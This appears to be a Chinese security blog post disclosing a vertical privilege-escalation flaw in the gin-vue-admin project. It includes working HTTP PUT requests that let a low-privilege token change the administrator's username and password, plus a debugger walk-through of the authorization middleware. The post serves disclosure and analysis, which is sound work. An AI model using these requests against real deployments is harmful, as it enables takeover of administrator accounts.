> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MZQuTLHiGwkKqSaDm7aatw)

**前 言**

欢迎各位大佬们给该项目点一个 star

```
https://github.com/flipped-aurora/gin-vue-admin/
```

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnUKLicuZyB1FFLZ2xc83DE2GQEx5dRDpKRAt8nrScGZnlP3URAricjDJw/640?wx_fmt=png)

文章写完了之后，申请 CVE 有一些麻烦，不过好在还是申请到了，github 的员工响应迅速。

ps：申请 CVE 前，已经提交了 CNVD。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffngVEkrDWWfCnJbJGBMcBy7WwlJbsEqaF87h6x0sicLxupFKLCykG3eUg/640?wx_fmt=png)

**环境搭建**

按照官方教程

```
git clone https://github.com/flipped-aurora/gin-vue-admin.git
```

随后进入 server 目录

```
go generate
```

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffngUTLTfaCEicuibhs1cfgicpKAxYC7KI5YtWKhmp08RFh8RE9fKwzpaV0g/640?wx_fmt=png)

```
 go build -o server main.go
```

随后直接运行 server 即可

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnVZdNzMGfYGRodehzcKCbGicUk6LibJWPpGLaVuOxMFMzbsialQyj7MM3g/640?wx_fmt=png)

随后是 WEB，进入到 web 目录，输入

```
yarn install
```

随后等待即可

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnDEXIf2b4iaOtuSUYGhib5zmjhJxb3cbibiaoLkmzR2E8brYs27z0dEbMZQ/640?wx_fmt=png)

随后安装完成会自动打开 WEB 网页

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffng3QO4TxxBb2O9Kukx0JklicZDaict3yJcCamAZDbibHOOylQC4SOBMJLg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnibIyBOHn6gV80c9YFCz4o0dfK9JiaQJGciah5TJbMHQibiaokqicuJYdmBPA/640?wx_fmt=png)

随后初始化设置数据库信息

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn4srboGBgz2NeMwICoNXNF6yGMcJCUa5DzfrF5O94fEjCzZSjcmnqCw/640?wx_fmt=png)

配置好之后点击初始化后登录即可

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnYFk2zQuG5jnDY3VR7quEagGicvibNpdVjnPjaWq9UG029GVkmwdczxHw/640?wx_fmt=png)

**漏洞复现**

_**SetUserInfo 存在垂直越权。**_

**1、SetUserInfo 接口越权设置用户个人信息**

我们直接来到用户管理页面，新增一个低权限的用户角色。  

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnFicuGeubmJWFEUxltG4BKboRgZx7ia9B3UeDiaqaBup0UmEdwfh6oUzmA/640?wx_fmt=png)

可以看到上方并没有给到管理员的权限，接下来新建一个账号，分给这个角色组

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnCYgjvwUYrCR23KKia9SNImWq9Zgzm1yuaYU6AZcVttfMNnjw2WKVj1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnzdCd4x6Nia6ILyUVb4HB1mr9Tk90zWN2JRibcfkSXeLSicn1c0DgrnQjw/640?wx_fmt=png)

漏洞发生的位置在

https://github.com/flipped-aurora/gin-vue-admin/blob/master/server/api/v1/system/sys_user.go 的第 273 行

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnxYicSdy5tib6vNOWDbsYhMLKPhOLib7V38MicakXDOdXCiaLtic3hCFnyb5Q/640?wx_fmt=png)

```
// @Tags SysUser
// @Summary 设置用户信息
// @Security ApiKeyAuth
// @accept application/json
// @Produce application/json
// @Param data body system.SysUser true "ID, 用户名, 昵称, 头像链接"
// @Success 200 {string} string "{"success":true,"data":{},"msg":"设置成功"}"
// @Router /user/setUserInfo [put]
func (b *BaseApi) SetUserInfo(c *gin.Context) {
  var user system.SysUser
  _ = c.ShouldBindJSON(&user)
  if err := utils.Verify(user, utils.IdVerify); err != nil {
    response.FailWithMessage(err.Error(), c)
    return
  }
  if err, ReqUser := userService.SetUserInfo(user); err != nil {
    global.GVA_LOG.Error("设置失败!", zap.Error(err))
    response.FailWithMessage("设置失败", c)
  } else {
    response.OkWithDetailed(gin.H{"userInfo": ReqUser}, "设置成功", c)
  }
}
```

这里没有对传入的 ID 进行校验，ID 代表用户的，直接传入指定的 ID 就可以修改对应用户的个人信息。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnH1lBU9p6x0ib7pMXnnAqzgXuuXlkCyiakSJP35iazGvQeR6KLiaERqDq8g/640?wx_fmt=png)

首先我们用管理员的 X-token 测试修改 ID 为 1 的用户的名称修改为 test1，随后我们可以在后台中看到管理员的 ID 已经被修改为 test1 了。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnicpC8kCuepzPM6hgGFuk7udT3bYt2OictGRelRTmdnC3FuzzKl8LqicZg/640?wx_fmt=png)

那么接下来，我们使用刚刚新建的 UzJu_HxSecTeam 账号的 Token 替换进去，将管理员用户名修改为 test2。

首先我们 UzJu_HxSecTeam 的账号个人信息 > 修改密码 这里随便修改密码，然后获取到账号 Token。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffncCdwKib0WW4e3JLTUUrhb4CPpfxWVVmtEhMeHxdAFr8ZkFiaTTPpkFMg/640?wx_fmt=png)

这个 Token 是低权限那个角色的，正常低权限的用户是不可以修改管理员的任何信息的。

```
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiYTM1NTRiYmYtYzQwNS00ZWEwLTkzZjQtMzQ1YTRiNzIxMWYxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1MDk5OCwiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODQ1MTk4fQ.0vm9DA7RHOi-ZBN6p-C4RIjJS7Qs9kbXKLNpmc6nyDs
```

我们将 Token 替换进去，构造如下 Json 数据

```
{
  "id":1,
  "username":"test2",
  "nickName":"test2",
  "headerImg":""
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnIxHzzmLzkR6w9uzbicyGzmQWbLIMYNVT2F1HTAQk0Ft0GMAo3tY1zdA/640?wx_fmt=png)

我们将 Token 替换到 setUserinfo 接口

```
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiYTM1NTRiYmYtYzQwNS00ZWEwLTkzZjQtMzQ1YTRiNzIxMWYxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1MDk5OCwiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODQ1MTk4fQ.0vm9DA7RHOi-ZBN6p-C4RIjJS7Qs9kbXKLNpmc6nyDs
x-user-id: 1
Content-Length: 67
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"test2",
"nickName":"test2",
"headerImg":""}
```

随后提示我们，设置成功

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnZVTMOJVsghP1Q7ib1KMqvB66iasOKYnBMOL5v6TGxShzYOlzOPYMXWiaw/640?wx_fmt=png)

这是我们切换到管理员账号，查看是否被修改为 test2。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn09JraNCGpPX0pjgQbxhw6Hx5APXiakJSltTZE1DmibbUv5epfWc3TUdw/640?wx_fmt=png)

可以看到管理员用户成功被修改。

**2、SetUserInfo 接口垂直越权无条件修改管理员密码**

在 Debug 的时候发现，在越权设置个人信息的接口 setUserInfo 中不单单只能设置 id, username, nickname,headimg，其实还可以传入 password 等参数。  

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnhxaZF0zjPjNIrdMhpvXk51l2j6IwL4I8kl6Uf0g8la8GiaoZyECOA8w/640?wx_fmt=png)

比如我们构造一个请求，将 ID 为 1 的用户名称设置为 admin，昵称设置为超级用户管理员。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnt6O1mTzzDZLLZJlmxL5HcWBbfbHJaNHqVPpibDJibzZwTqkoPKDq5xTQ/640?wx_fmt=png)

```
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiZjkwNjRhMWItNzU2Yi00NTNjLTlkNDAtOWZlZmY5OWI2ZTUxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1Nzc1NywiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODUxOTU3fQ.rHCKW7c2kIsaCRKsgI1Nizu18dGKfsOH_m_dW59cY9U
x-user-id: 1
Content-Length: 91
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"admin",
"nickName":"超级用户管理员",
"Password":"qwe@123"
}
```

此时管理员的密码已经被修改为了 qwe@123，尝试登陆。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnDibzibH74chxmn2KXEmedg5MZC9QmiabmUJwicsFvKRaicib4T9ianwDw6a7g/640?wx_fmt=png)

随后成功登录

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnQquwe6hWaCIbicgvOmXnlzeugvh3qxGDibXeyXUCd5FA6wcpUffTCJMg/640?wx_fmt=png)

**3、越权修改用户密码**

PS: 这里有一个前提，需知道我想修改的那个人用户的密码才可以。  

首先我们知道默认的 admin 密码为 123456，这个时候我们只需要构造 Json 数据，将 Json 数据中的 username 参数，修改为我们想越权修改的那个用户名即可。

首先我们登录低权限的账号，修改一次密码。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnJaGWjWOb116HLg66z23jOOSGS79rcepb1yacXwIos1ctJ3BFJqy7vA/640?wx_fmt=png)

我们会抓到一个 changePassword 的请求，随后将这个请求放入 Repeater。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffngxNcCK8PLIwhCRjSYv2CgrgXdt6AhEPBc61QnzcerUnFFv0M1LPibqA/640?wx_fmt=png)

随后我们只需要将 username 这个参数修改为 admin 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn9XIIJDgia8ETeD0dOx0jlLjTSibibtssXicHArqxhgDcCmCJVMEiaUvozxg/640?wx_fmt=png)

随后会提示我们修改成功，然后我们使用新的密码来登录 admin。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnLDWFfLf2aPouH60D7OglV4lqACRNF6FQxntNTbQF76N8X6bZ4AHlPg/640?wx_fmt=png)

随后成功登录

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnUOUUzFfjWy84KMUryvVAY5lzUnqmR3GJCz0oYTAUXxOhQLVxxroDfw/640?wx_fmt=png)

漏洞出现的位置在

https://github.com/flipped-aurora/gin-vue-admin/blob/master/server/api/v1/system/sys_user.go，139 行

```
// @Tags SysUser
// @Summary 用户修改密码
// @Security ApiKeyAuth
// @Produce  application/json
// @Param data body systemReq.ChangePasswordStruct true "用户名, 原密码, 新密码"
// @Success 200 {string} string "{"success":true,"data":{},"msg":"修改成功"}"
// @Router /user/changePassword [post]
func (b *BaseApi) ChangePassword(c *gin.Context) {
  var user systemReq.ChangePasswordStruct
  _ = c.ShouldBindJSON(&user)
  if err := utils.Verify(user, utils.ChangePasswordVerify); err != nil {
    response.FailWithMessage(err.Error(), c)
    return
  }
  u := &system.SysUser{Username: user.Username, Password: user.Password}
  if err, _ := userService.ChangePassword(u, user.NewPassword); err != nil {
    global.GVA_LOG.Error("修改失败!", zap.Error(err))
    response.FailWithMessage("修改失败，原密码与当前账户不符", c)
  } else {
    response.OkWithMessage("修改成功", c)
  }
}
```

**漏洞原理分析**

ps: 以下所有内容出自一个完全没学过 Go 的，也没做过开发的，只会 Python 的脚本小子的理解。

首先从正常的业务逻辑来看这里为什么会造成越权，其实原理比较简单，主要是因为，我们在新建角色权限的时候，有几个必选的参数，也就是这几个参数，选了之后，用户才有机会越权（但是也不能不选，因为这是默认的必选参数），其实最终还是在代码上存在逻辑问题。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnYK4D89HKVuwWyypKEj6G0dNe8OAP7nxMW3IRj5xiagBiaicKic6C4YkO7A/640?wx_fmt=png)

首先我们看，在新建完角色之后，查看角色的权限

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnaf4LeIMOZHf3UuAWCVjLQkQvbBLkvxMibWQ6pWjtL0KqwlsJvTiaJ6Jw/640?wx_fmt=png)

可以看到，默认新建的用户权限，在角色菜单中，只有一个可以访问仪表盘的权限，但是我们查看角色的 API 权限就会发现。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnVrciaPm0FO2McrmkD3CtIAwHWmpDM5OdyHY6OlSbRIGiaX5AEY4RKLqQ/640?wx_fmt=png)

这里有几个必选的权限

*   用户注册
    
*   设置用户信息
    
*   获取自身信息
    
*   修改密码
    
*   修改用户角色
    

这也是这一次漏洞的来源，首先是设置用户信息，如果我们取消勾选。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnur3aCpp3aaLHDibgnro2etTZWORqwPFZKcicjS7ra6rWIvVQURAeWlAg/640?wx_fmt=png)

然后我们将低权限角色组的账号 Token 放进 Burp 进行尝试。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnL9Va7kJvuoMXXjdcvlCDWCFBMQ6h6QA9ohFCcFxpETHHAWJMaTBlKw/640?wx_fmt=png)

```
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiZjkwNjRhMWItNzU2Yi00NTNjLTlkNDAtOWZlZmY5OWI2ZTUxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1Nzc1NywiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODUxOTU3fQ.rHCKW7c2kIsaCRKsgI1Nizu18dGKfsOH_m_dW59cY9U
x-user-id: 1
Content-Length: 83
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"admin",
"nickName":"超级用户管理员",
"headerImg":""}
```

可以很清楚的看到，目前我们已经没有权限来设置这些用户信息了，而且在 Go 的 Debug 页面我们也很容易发现，代码逻辑，比如我们现在是没有权限进行设置用户信息的。

但是在代码中理论来说，我访问了这个接口，我 Debug 的断点应该是可以拦截的，但是如下图，我下断点之后，程序居然没有停止。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnuQJF8lJCje6YwjnZG7wEKmiaRvO1N18drx3fFWt0QOqNnvY1HJYvYgw/640?wx_fmt=png)

从这里就能判断，在此操作之前，应该是有一个鉴权操作（常见的应该是 rbac 吧）那么我们现在给低权限角色组设置用户的权限，我们再进行重放看看。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffntT98l6LfibOQPqicA4hX3uvnrJZEAXPID6Z5bxAc5AGTajX9rwoyfITw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnHScTc9jEcLAug7CuUx5QVdm2GmbNuDyuQezItdR0EB8YFFk7kDtmQw/640?wx_fmt=png)

我们可以看到，程序成功停止在了这里，那么我想 (go 小白) 应该可以通过 Debug 的方式，来找到这里的鉴权：）

首先 Mac 下 command 键鼠标左键来找哪里调用了这个函数。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnFSK3icuuEIPPH4PyLMHr0mn1ibwjkCib7gLgZP4OwKyrIhT3Flu6RNLlw/640?wx_fmt=png)

然后可以看到这里有一个初始化用户路由的一个函数 InitUserRouter

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffngCDzsYCIA1Q2kaEao2lMdFpVcO3zX8riaCALQ0phlwrgJNga1YAlvmw/640?wx_fmt=png)

那么继续老办法，Command + 鼠标左键来判断哪里调用了 InitUserRoute

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn8giak5EsSqY0dlfMWd6ibdnNvBAIveecVSlQ2LBXTmyOd2wdoiaLMCajQ/640?wx_fmt=png)

这里注意，有一个 JWTAuth() 还有一个 middleware.CasbinHandler()

首先我们先来看 middleware.JWTAuth()，还是老方法 Command + 鼠标左键。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnhge6icmmO8UWY8qKxYdmRp4jVuDvrPJibzPy2kf7nG7fECtD9NjFvNpw/640?wx_fmt=png)

然后来到一个 jwt.go，这里的逻辑我们可以看一下（当然也感谢作者写了一些注释)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn4wtby2eoU3dc4eqyiarCcjdENahhow1EaoR3TrpEUcA8SMpfrY9iaVxg/640?wx_fmt=png)

go 中 token:= 应该是相当于定义一个变量来接收请求中的 header 中的 x-token，首先就是判断 token 是不是为空，如果为空的话直接返回用户未登录或非法访问。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnVPqYtJnBHicWZuEp6fYVTpXTaeLem5tKXoJ8UIWddoeNVRTLzeYeqdg/640?wx_fmt=png)

随后就是判断用户的 token 是否在黑名单里面，这里应该是通过缓存或者用户退出的时候来判断，这个 token 是不是已经失效了吧，如果失效了就会返回告诉用户异地登录或令牌失效了。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn03dDWbAENFXqsKIHMTRic4XEHGVdVlop0Njbm2NSEjG24ia1sJGoEicPA/640?wx_fmt=png)

这里首先传给 ParseToken 这个函数来解析 Token，可以跟过去看一下。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn4njWvicPUTzb81cbGIZhno7quqv1wvXoPpibN1vc88uJh19L50Mpf7rw/640?wx_fmt=png)

不懂 jwt.ParseWithClaims 是啥。。。传统艺能，google.com。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnqsNB5hbLECcjV0aqkicDsp9NHQBow7IwPCgKON3QdAFQfcb0NwZKrRw/640?wx_fmt=png)

https://www.cnblogs.com/taoshihan/p/15239208.html

这里是用来 JWT 加解密的，然后返回一个 SigningKey，然后继续往下走。

感谢作者的指点：此处将传入的 jwt token 串进行解析，获得 jwt.Token 结构体，然后从结构体解析出 Claims 获取之前我们生成 token 时挂载在上面的用户信息。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn9WnM3fkk4f9VgRW60EHWJjmIf9UGFXicYNgoicRjhf3LBdOJnPB4yiagg/640?wx_fmt=png)

通过 Google 知道了 ValidationErrorMalformed 用来判断是否是错误的 token，然后再通过 ValidationErrorExpired 来判断是否已过期，然后再通过 ValidationErrorNotValidYet 判断 token 是否激活，然后就是返回了。虽然下面还有一段代码：

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnSCKibexzibw7hmRNvK1wDYniaPkJA9VqjzwlibxXHyiayh3qWtmrcKicmPzg/640?wx_fmt=png)

随后判断 token 是否过期，如果没有过期，则走到了 reload，随后我们来到 middleware.CasbinHandler()

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnZIbBflBqINhsXD8KZfP0Mfku4abY3l2STbovcMlOOjQvv6AKLibdgzw/640?wx_fmt=png)

首先进入到 utils.GetClaims 并且传入一个参数。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnSyHpmIwawbtThf2uOqTaG5Kb9icccxgOMRJl1J4LJNIXb38ibdIeBB8Q/640?wx_fmt=png)

这里函数用来获取 x-token 随后解析该 token 来判断是否过期等。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnKQncyTfCl58tzyWyiaVwVK49kCPJCcj3sLZdu1sjaaFXIe4GbssWM1A/640?wx_fmt=png)

随后判断用户的角色，这里的 1234，也就是我们 web 设置的角色组 ID。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnWxURkTksQocGMjvW7r6kiaGDiaJW743CXh0PFn3uSV7JPPpqaric9lHoA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnxkyOvTSOuZxrxsQ8WVjNr9U5Tk7GEa8hsOw3dS0sARmTkb8EC3v3LA/640?wx_fmt=png)

随后进入 casbinService.Casbin()，传统艺能，直接百度。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnsic37IXJHdfO1VWyFaFeId94b00EgBDwQH3w0eInyHiajRhib2A0wKydA/640?wx_fmt=png)

跟之前猜想的差不多，rbac 权限控制，这里是连接数据库，然后这里 F7 单步步入看了一下，劝退了，看不懂。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnoJM5tYP0zn53ibZWicV8vlaseMeYka5KApzMUTEZWPvo0N16iaS0kmULA/640?wx_fmt=png)

**看注释可以判断，这里用来判断权限**

机翻： Enforce decides whether a "subject" can access a "object" with the operation "action", input parameters are usually: (sub, obj, act).

强制决定 “subject” 是否可以通过操作 “action” 访问“object”，输入参数通常是:(sub, obj, act)。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnJQHObkGtw7u9Eb8zGiajkT2jstVVJdCRDVYUMD03YxIjS9OBWajeK4w/640?wx_fmt=png)

随后判断是否在开发环境，然后 success 等于 false，这里 || 或者的意思，要么成功，要么提示权限不足。

我们来看看有权限后，越权的 setuserinfo 接口是怎么走的，首先我们在拦截器这个地方下一个断点。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnrU9jlTcpL7pXLKFCgaW0Whd0gSJ6gPRk8DtrsmUT9cpBicEY64sMMqw/640?wx_fmt=png)

Tips: 通过百度发现这里用的是 golang 的 casbin 访问控制框架

https://blog.csdn.net/qq_42015552/article/details/104013264

然后在 setuserinfo 这里也下一个断点

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnndOezZQ2Zxd5GOL8om5IFH8p9x00kDhrIBD3weC1ZLuXYSWyhGAzdQ/640?wx_fmt=png)

因为拦截器在程序逻辑中在 setuserinfo 前面，所以我们从拦截器开始调。

burp 发送请求之后，一直等待，此时我们单步调试看看。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnuQ07qAn3s4aDBY8NzhYLZAzaP3TkD85Oru6CmYRMzJHic3ODhfHoVnA/640?wx_fmt=png)

此时我们的角色组为 1234

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnR499xUiarZwVnmiaN0RkplKUic6Rqcd3iaviagGjibvYnrJcaVCepeK8Pzhw/640?wx_fmt=png)

随后是连接数据库，再之后就是检查权限

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnWZQcA3hG6U5LTNLzW2rfD93P3wLxaHKBu2TfQkrwUQ4aW3icVHwlnrA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffncHoEShXvfMMJM13REzPoEndGMBqGkyA8VBEa21KhyWYZGP9tyKTvOw/640?wx_fmt=png)

这里返回了一个 true，说明权限存在，随后就是判断是否为开发环境或者 success 等于 true 了，这里肯定会经过第一个 if，

随后就来到了 setuserinfo 接口

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn0vl9dV1cuXB1SLHsZ1xObwcYNCVhhQbBc7Zjevwylop6hibJOibwrd1g/640?wx_fmt=png)

shouldBindJson 绑定了 Json 参数

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnHQzsoS0WuJBj5YDbibjPlI4my2Tb6szubxQTic6bA0Rvic35OUwQEB0vg/640?wx_fmt=png)

随后这里，应该是用来判断传入的 Json 参数是否正确

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnhKwdrMgCQ18icuq6YOpFUMCicMYJnOTFmSJE8CDyl0uSOAcs2FtM2YfA/640?wx_fmt=png)

下面直接直接将 userid 代入了进去

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnBhnwImBBnO99Hd4IqWD0Ags5UorgOkn5xHhnibf0icUvickZY2PUQ9ylw/640?wx_fmt=png)

这里的 ID 是我们前端传入的，可以任意修改，所以就导致了越权

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnGPIgbFBJExWwXXrVbha6cZdq4cnQSWgcZN0N9lSuYRrTfbgn7JqOCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnvKJ8nVUfR29B8Fcm3070KNhlXNMCE0hEbicLwUfKic7DGzMeib7O7UBibA/640?wx_fmt=png)

随后代入到数据库之后，更新后返回

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnqVonNy9jpYU6hTxzMt5poXOCnUTuMEb12Ow4pWibJNFck8ANSgsEAnA/640?wx_fmt=png)

随后则是更新成功

